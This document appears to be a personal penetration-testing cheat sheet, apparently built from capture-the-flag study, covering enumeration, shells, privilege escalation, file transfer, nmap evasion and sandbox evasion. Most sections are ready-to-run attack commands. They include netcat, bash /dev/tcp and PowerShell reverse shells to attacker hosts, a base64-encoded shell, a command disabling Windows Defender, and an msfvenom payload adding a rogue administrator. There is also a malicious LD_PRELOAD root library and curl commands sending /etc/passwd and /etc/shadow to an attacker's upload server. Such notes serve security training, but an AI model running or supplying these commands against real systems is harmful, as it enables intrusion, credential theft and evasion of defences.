- [BASIC ENUM](#basic-enum)
- [Existing Tools](#existing-tools)
- [Ping and Port Scanning - Ping Sweep](#ping-and-port-scanning---ping-sweep)
- [Shells](#shells)
  - [Metasploit](#metasploit)
  - [MSFvenom](#msfvenom)
  - [Bypass AV](#bypass-av)
  - [Meterpreter](#meterpreter)
  - [Metasploit with database](#metasploit-with-database)
  - [Stabilizing - spawn shell](#stabilizing---spawn-shell)
  - [Webshells](#webshells)
- [PWNCAT-CS](#pwncat-cs)
- [Privilege Escalation](#privilege-escalation)
  - [shared libraries](#shared-libraries)
  - [capabilities](#capabilities)
  - [Cronjobs](#cronjobs)
  - [PATH](#path)
  - [PYTHON PATH HIJACKING](#python-path-hijacking)
  - [Executables](#executables)
  - [Finding Important Files](#finding-important-files)
- [File Transfer](#file-transfer)
  - [Native tools](#native-tools)
  - [Encrpytion](#encrpytion)
  - [Using code](#using-code)
  - [Using HTTPS](#using-https)
- [Searchexploit](#searchexploit)
- [Code Analyse](#code-analyse)
- [Port Scanning (NMAP - DB\_NMAP - Socat)](#port-scanning-nmap---db_nmap---socat)
  - [Firewal Evasion](#firewal-evasion)
  - [Routes](#routes)
  - [Fragmentation/MTU/Size](#fragmentationmtusize)
  - [Summary](#summary)
- [Sandbox Evasion](#sandbox-evasion)
- [Memory Dump (more learn)](#memory-dump-more-learn)
- [Recover files](#recover-files)

## BASIC ENUM
- Questions
  - Distro
  - shell/languages available
  - functin of the system
  - applications
  - known vulns
- User/groups
- hostnames
- routing tables
- network shared/services
- application / banner
- firewall
- service
- snmp, dns
- credentials
- ping
  - [Default TTL](https://subinsb.com/default-device-ttl-values/)

## Existing Tools
- ls /etc/*release = version, os
- hostname
  
- var/mail
- /etc/hosts
- /etc/resolv.conf
- /usrbin/ /sbin/ = installed apps
- rpm -qa = query packages
- dpkg -l = debian
- who
- w = more powerfull
- id
- last = who used
- sudo -l = commands for invoking user
  - what kind of command can be run
  
- ifconfig - nmcli dev show / ipconfig /all
  
- netstat
  - -a = all listening/non-listening
  - -l = listening
  - -n = numero
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports
  - tulpn
  - putan
- ss
  - -l = listening
  - -t = tcp
  - -u = udp
  - -n = not resolve
  
- arp -a = find neighbors
- lsof = List Open Files
  - -i = internet

- ps
  - -e = all
  - -f = more info
  - -l = long format
  - -ax/aux = comparable
  - -j = job format
  
- [pspy](https://github.com/DominicBreuker/pspy)
  - -pf: command + file system
  - -i 1000 = every ms

## Ping and Port Scanning - Ping Sweep
```
# Hosts
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

# Ports
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

## Shells
- Reverse:
  - **Atacker** LISTENER <--------- **Target**
  - [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bind
  - **Atacker** LISTENER ---------> **Target**

- **Connect**
  - -u = UDP connection
  
```
nc $ATTACKER 1234 -e /bin/bash
nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
mkfifo /tmp/f; nc $ATTACKER 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TARGET 1234 >/tmp/f
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234 > /tmp/f

1. rm -f /tmp/f = remove the file /tmp/f if exists (-f)
2. ; = sequential execution
3. mkfifo /tmp/f = create named pipe
4. cat /tmp/f | = concatenates the FIFO named pipe file 
5. | = connects stdout to stdin of the commands
6. /bin/bash -i 2>&1 | = specifiy the bash interactive (-i) + standard error data stream (2) $ standar output data stream (1) redirected to the next command
7. nc -l $TARGET 1234 > /tmp/f = send the result to nc, output sent to /tmp/f that uses bbash sehll waiting for the connection
```

- **No NC**:
```
bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1

# Encode to base64 for oneliner + decode
echo -n 'bash -c "bash -i >& /dev/tcp/ATTACKING_IP/ATTACKING_PORT 0>&1"' | base64
echo base64encoded== | base64 -d | sh/bash

# Try different shels /bin/bash | sh
``` 

- **Powershell**
```
# Disable antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# Shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- **Reverse shell**
  - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

- **Listener**
  - nc -nlvp PORT ==> TCP listener
  - nc -ulvnp PORT ==> UDP listener

### Metasploit
- [Community vs Pro](https://www.rapid7.com/products/metasploit/download/editions/) 
- [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
  - paste: /usr/share/metasploit-framework/modules/exploits
- Load Module
  - Find module in searchsploit
  - Copy module to same folder structure but in *.msf4/module/*
  - in msfconsole run *reload_all*

```
# Find module in searchsploit
searchsploit module_name

# Create a similar folder as module in the msf path + 
```
- use exploit/multi/handler
  - post/multi = post exploitation (generic)

- search
  - platform:
  - type:
  - author:
  - app:
  - name
- show options
- setg => set global valules
- unsetg => unset global values
- background => putting a session in backgrou
- sessions => display sessions
- Direct execution
  - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""

### MSFvenom
- List payloads
  - msfvenom -l payloads | encoders | nos | platforms | formats | all
  - -p payload --list-options
- Many platforms and formats
- Example generate hex of payload:
  - Method 1
    - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
  - raw binary file .bin:
    - binary ==> msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
  - convert to hex:
    - xxd -i file.bin ==> generate payload for .c
  - Creating basic payload
    - msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT -f elf > payload.elf
    - msfvenom -p  windows/shell_reverse_tcp LHOST= LPORT -f exe > payload.exe

- [Stage vs Stageless](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
  - stageless: shell_reverse_tcp = one thing only
  - staged: /shell/reverse_tcp

- Smaller payloads
  - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**

- Binding
  - Merge shellcode WITH normal program
  - Fool users
  - still can be detected by AVs
  - Better: encode + encrypt + packers + binder

- Encoding and Encrypting
  - msfvenom --list encoders / encrpyt
  - -e encoder_option
  - -i interation

### Bypass AV
|                                       Source                                       |
| :--------------------------------------------------------------------------------: |
| [MSFVenom & Metasploit-Framework ](https://github.com/rapid7/metasploit-framework) |
|   [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)   |
|           [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)           |
|                 [Nishang](https://github.com/samratashok/nishang)                  |
|                 [Darkarmour](https://github.com/bats3c/darkarmour)                 |

### Meterpreter
- sysinfo
- getpid
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search

### Metasploit with database
- Basic usage
  - use handler/multi
  - set payload

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

### Stabilizing - spawn shell
- Spawn shells
  
```
# Python
python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
python3 -c "import pty;pty.spawn('/bin/bash')"
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";

# Ruby
ruby: exec "/bin/sh"

# Lua
lua: os.execute('/bin/sh')

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

# Vim
vim -c ':!/bin/sh'
```
   
-  export TERM=xterm = commands like clear
-  ctr + z = back to our shel
-  stty raw -echo; fg = back to reverse shell

### Webshells
- browser based
- [Laudanum shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [Nishang](https://github.com/samratashok/nishang)

## PWNCAT-CS
- nc with steroids
- python version => stabilized
- easier to transfer file
- python3 -m venv pwncat-env
- nc.exe -nv 10.9.1.255 1234 < logins.json
- source pwncat-env/bin/activate
- pwncat-cs -lp PORT

## Privilege Escalation
- https://tryhackme.com/room/introtoshells
- https://tryhackme.com/room/linprivesc
- Check list
  - hostname
  - uname -a = sys info, kernel
    - cat /etc/lsb-release
  - /proc/version = process, compiler,
  - /etc/issue = OS info
  - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
  - env = environmental variables
  - cat /etc/passwd | cut -d ":" -f 1 // grep home
  - ifconfig
  - netstat -a | -at [tcp] -au [upd] | -l [listening] | -s [statistic] | -tp [pid] | -i [interface_data]
    - ss = see sockets
  - find 2>/dev/null = redirect errors
    - -name, -perm a=x, -mtime
    - find / = directory config
    - -perm -u=s = SUID
    - -name perl*, python*, gcc* = dev tools
    - find / -type f -perm -04000 -ls 2>/dev/null ==> *SUID or SGID* files
    - find / -perm -u=s -type f 2>/dev/null
    - find / -writable 2>/dev/null ==> find writable folders
      - sudo -u OWNER file

 sudo -l
- [GTFOBins](https://gtfobins.github.io/gtfobins/find/)

### shared libraries 
- sudo -l ==> LD_PRELOAD ==>   
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
- ldd = shared object dependencies
  - ldd /path/to/file

```
# Bad library
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

# Compile bad library
gcc -fPIC -shared -o root.so root.c -nostartfiles

# Run executable with library
LD_PRELOAD=root.so executable restart
```

- non-standard libraries
  - readelf -d EXECUTABLE = find path of non standard library

- Find function executed in the file
- Create malicious file with function name 
- compile malicious file and put in the folder
- Execute target file

### capabilities
- find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
- binary can set perform specific actions
  - cap_sys_admin
  - cap_sys_chroot
  - cap_setuid
  - cap_dac_override
  - +ep = effective and permitted privielges
  - +ei=inheritable priielges + child process
  - +p=for specific no inherent
- getcap -r / 2>/dev/null
- setcap CAP_NAME= /path/to/file

### Cronjobs
- privilege of the owner
- find script with root privilege
- /etc/crontab
- /etc/cron.d
- check if file has no fullpath + create own script with reverse shell

### PATH
- Modify $PATH variable
- Add file
- echo $PATH
- export PATH=/path/to/folder:$PATH
- PATH=$PATH:/path/to/folder
- find / -writable 2>/dev/null ==> find writable folders
  - find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
  - find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u ==> exclude running process

### PYTHON PATH HIJACKING
- Check libraries of python script
- Write "own" library with malicious code
- SETENV enabled?
- Execute script setting path
  - sudo PYTHONPATH=/path/to/bad/library script
- Modify library
  - pip3 show library = location of the library
  - Has the lib write permission?
    - python3 -c 'import sys; print("\n".join(sys.path))'

### Executables
-SUID = Set User ID = Run with the privilege of the owner not of the user
- Option 1
  - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

- Option 2
  - strings /usr/local/bin/suid-env2
  - /bin/bash --version < 4.2
  - function /usr/sbin/service { /bin/bash -p; }
  - export -f /usr/sbin/service
  - /usr/local/bin/suid-env2

### Finding Important Files
- History
  - cat ~/.*history | less
  - .ssh Folder is always a must

## File Transfer
- **Enconding**
  - cat /path/to/file | base64 -w 0;echo ==> Encoding
  - echo -n 'base64' | base64 -d > file  ==> Decoding
    - uncompres file.Z
- **wget | curl**
  - wget http://$ATTACKER/file -O file
  - curl http://$ATTACKER/file -o file
    - | bash  ==> fileless
    - | python3
  
- **HTTP local server**
```
# Attacker
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8080
ruby -run -ehttpd . -p8000

#Target
curl attacker-machine:8000/file.ext
chmod +x file.ext

# Attacker: for file UPLOAD
sudo python3 -m pip install --user uploadserver

## Create self-signed certifiate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

## Create folder + start server
mkdir https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Target
curl -X POST https://$ATTACKER/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
wget $ATTACKER:8000/filetotransfer.txt
```
 
- **With bash**
  -  --enable-net-redirections
```
# Connect to Attacker
exec 3<>/dev/tcp/10.10.10.32/80

# Get file
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Response
cat <&3
```

- **SSH**
  - scp user@$TARGET:/path/to/file .
  - scp /path/to/file user@$TARGET:/copy/here
    - -r = recursive
- https: Create certificate + spawn https server
  - openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
  - python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

   
- option 3 - smbserver
  -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
  -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
  -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
  -  smbclient -U USER '//IP/folder'

### Native tools
- **NC**
  - Transfering files
      1. Start listener with nc with redirection
      2. Send file using ncat
```
# Sending to TARGET
## Target: receive the file
nc -l -p 8080 > File.exe
  ncat -l -recv-only = closes the connection once received

## Attacker: send the file as input
nc -q 0 $TARGET 8000 < file
  -q 0 = closes the connection once sent
  ncat -l --send-only

# Sending to TARGET
## Attacker
sudo nc -l -p 443 -q 0 < SharpKatz.exe

## Target
nc 192.168.49.128 443 > SharpKatz.exe
```

- [Linux - GTFOBins](https://gtfobins.github.io/)
  - +file download/upload

### Encrpytion
- openssl

```
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /input/file -out file.enc
-enc = encryt
-inter = iterations
-pbkdf2 = password-based key derivation function 

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file
```

### Using code
- Python oneliner:
```
# Download
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Upload
## Attacker 
python3 -m uploadserver

## Target
python3 -c 'import requests;requests.post("http://$ATTACKER:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

- PHP
```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Peping to create fileless
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
- Ruby
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- Perl
```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

- [JavaScript file upload](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)
```
# wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

# Download file
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

- VBScript
```
# VBS code
im xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

# Download file
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Using HTTPS
- **Nginx**
```
# Attacker
## Create Folder to updates
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

## Change owner
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

## Create Nginx config file
in /etc/nginx/sites-available/upload.conf 
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

## Symling Site do sites-enabled
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

## Start nginx
sudo systemctl restart nginx.service

## Problem with port = remove default nginx

## Connect
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```
- 
- 
-  **Apache**


## Searchexploit
- m = copie

## Code Analyse
- snyk --scan-all-unmanaged
  - unpack zip file

## Port Scanning (NMAP - DB_NMAP - Socat)
- db_nmap (for metasploit) | nmap
- Scripts
  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
    - https://www.exploit-db.com/
    - https://nvd.nist.gov/vuln/full-listing
  - -sC: other common scripts
  - Search script: **locate -r nse$ | grep NAME**
  
- Basic scans
  - -sS (Syn), -sA(Ack), -sU (UDP)
  - -A: basic scan with OS include
    - -sV -O -sC [default scripts] --traceroute
  - -sV: version of services found
  - -p-: all ports
  - -Pn: no ping
  - -e INTERFACE
  - -PN no ping
  
- Output
  - --reason / -v / -vv / -d / -dd
  - -oN = normal output
  - -oG = grep output

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

### Firewal Evasion
- Stateless: individual package
- Statefull: stablished TCP session (all related packets)
- NGFW: application layer

### Routes 
- Controll source MAC/IP/PORT
- Proxy
  - --proxies proto://host:port,proto://host:port
    - HTTP:HOST1:PORT,SOCKS4://HOST2:Port
    - --proxies IP target
  
- Spoofed address (MAC, IP)
  - --spoof-mac MAC_ADDRESS (spoof mac - same network segment)
  - -S IP (spoof address - same network)
  
- Decoy: random address
  - -D ip,ip,ip,ip,ME
  - -D RMD,RND,RND,ME
  
- Fixed Port
  - -g 123 / --source-port 123 ==> all trafic from the specific port number
  - UPD 53 - dns (looks like dns query)
  - TCP 80 - http (looks like from web server)

### Fragmentation/MTU/Size 
- Size and intensitiy
  - -T[0-5] = Control speed
  - -F = faster
  -  -f = 8 bytes / -ff 16 byes = fragmentation
  - --mtu 128 = custom size
  - --data-length VALUE

- Headers (TTL, IP options, checksum)
  - --ttl # 
  - --ip-options HEX
    - R, T, U ,L ,S 
    - R = record-route
    - T = record timestamp
    - U = route and timestamp
    - L = loose source
    - S = strict source
    - "L IP IP" = loose route packets routed to L IP
    - "S IP IP" = strict route, every hope defined

- Invalid packets
  - --badsum = alterad package
  - --scanflags URG,ACK,PSH,RST,SYN,FYN {SYNRSTFIN}
  - Alternative
    - hping3
      - -t time to live
      - -b badsum
      - -S,-A,-P-U-F-R

### Summary
| Approach      | NMAP Command                |
| ------------- | --------------------------- |
| Decoy         | -D IP,IP,ME, RND,RND,ME     |
| Proxy         | --proxies URL,HOST:port     |
| Spoofed mac   | --spoof-mac MAC             |
| Spoofed ip    | -S IP                       |
| Src Port      | -g PORT, --source-port PORT |
| Fragment      | -f 8 bytes, -ff 18 bytes    |
| MTU           | --mtu #                     |
| Lenght packet | --data-length #             |
| TTL           | --ttl #                     |
| IP options    | -ip-options RTULS           |
| bad sum       | --badsum                    |

- Convert to html
  -  xsltproc input.xml -o output.html

## Sandbox Evasion
- Sleeping / Time Evasion
  - [Thead based](https://www.joesecurity.org/blog/660946897093663167#)
  - [Evasions Timing](https://evasions.checkpoint.com/techniques/timing.html)
- Geolocation: find ISP
  - [ifconfig me](https://ifconfig.me/) + [ARINS RDAP](https://rdap.apnic.net/ip/1.1.1.1)
- systeminfo (windows) / lscpu
  - also: hostanme, Sotrage serial number, BIOS/UEFI version, OS version, Network adaptor, Virtualization checks, Signed user
  - less memory or space MAYBE sandbox
- NOT in AD
  - but collect info
  - variables
  - echo %VARIABLE%

**Learn more about it**


## Memory Dump (more learn)
- volatility
  - -f = memory dump file
  - -v = verbosity
  - -p = override location of pluggins
  - -o = outputlit
- Pluggins
  - listing process
  - network connections
  - clipboard, text, cmd
  - imageinfo = find OP
    - python3 vol.py -f file.vmem  windows.info
    - many other pluggins

## Recover files
- lsblk = show all disk
- interact with disk
  - grep 
    - -a binary
    - -P patters
    - -o match
  - strings
- dd = convert/copy file
  - dcfldd: forensict tool to extract file
- df -h = mounted 
- testdisk
- mount
- du: file space
- binwalk: search binary images
  - -M: recursively
  - -e: extract